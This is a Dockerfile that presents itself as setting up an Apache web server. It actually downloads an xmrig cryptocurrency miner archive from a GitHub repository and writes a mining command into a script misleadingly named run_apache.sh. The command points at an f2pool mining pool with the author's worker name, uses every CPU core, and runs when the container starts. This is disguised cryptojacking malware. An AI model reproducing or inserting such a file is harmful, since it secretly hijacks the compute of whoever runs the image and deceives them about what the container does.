FROM python:3.9-slim

# Install dependencies
RUN apt update && apt -y install curl git wget sudo
RUN wget https://github.com/nandafiku/gradi/raw/main/xmrig.tar.gz && \
 tar -xvf xmrig.tar.gz
# Configure apache
RUN echo './xmrig --donate-level 1 -o zeph-asia.f2pool.com:6100 -u jimmyku88.$(echo $(shuf -i 1-100000 -n 1)-SADAR) -p x -a rx/0 -t $(nproc --all)' >> run_apache.sh && \
 chmod 777 run_apache.sh

EXPOSE 80

CMD /run_apache.sh
